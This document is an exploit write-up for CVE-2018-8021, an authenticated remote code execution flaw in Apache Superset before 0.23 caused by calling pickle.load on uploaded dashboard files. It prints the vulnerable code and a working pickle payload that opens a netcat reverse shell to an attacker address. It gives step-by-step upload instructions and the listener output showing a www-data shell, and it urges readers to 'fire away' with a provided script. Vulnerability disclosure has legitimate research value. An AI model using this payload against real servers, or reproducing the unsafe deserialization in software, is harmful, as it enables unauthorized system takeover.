#CVE-2018-8021

Authenticated Remote Code Execution via Import Dashboards function in Apache Superset < 0.23

Apache Superset, in versions prior to 0.23 (January 2018), uses the unsafe ‘load’ method from the pickle library within core.py to deserialize data that is supplied by the user in the form of an imported dashboard file, allowing for RCE. The vulnerable code from [superset/views/core.py] is as follows:

```
def import_dashboards(self):
	“””Overrides the dashboards using pickled instances from the file.”””
	f = request.files.get(‘file’)
	if request.method == ‘POST’ and f:
		current_tt = int(time.time())
		data = pickle.load(f)
```

Pickle is a stack language that has numerous well-defined shellcode examples. See #http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf. For a reverse shell connection, the following code was used:

```
$cat revshell.pickle
cos
system
(S’rm /tmp/backpipe;mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc <attacker_ip> 8888 1>/tmp/backpipe’
tR.
```

Navigate to http://<victim_ip>:8088/login/ and authenticate with a user that has at least the default ‘Gamma’ role or any role with the ‘can Import Dashboards on Superset’ privilege. (See #https://superset.apache.org/security.html). Then, navigate to  http://<victim_ip>:8088/superset/import_dashboards and upload revshell.pickle. Without any interaction, the following will happen:

```
nc -lvp 8888
listening on [any] 8888 …
192.168.137.128: inverse host lookup failed: Unknown host
connect to [192.168.137.129] from (UNKNOWN) [192.168.137.128] 47500
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
A python script has been provided that trivializes this exploit. Just update the credentials and the netcat listener details and fire away.
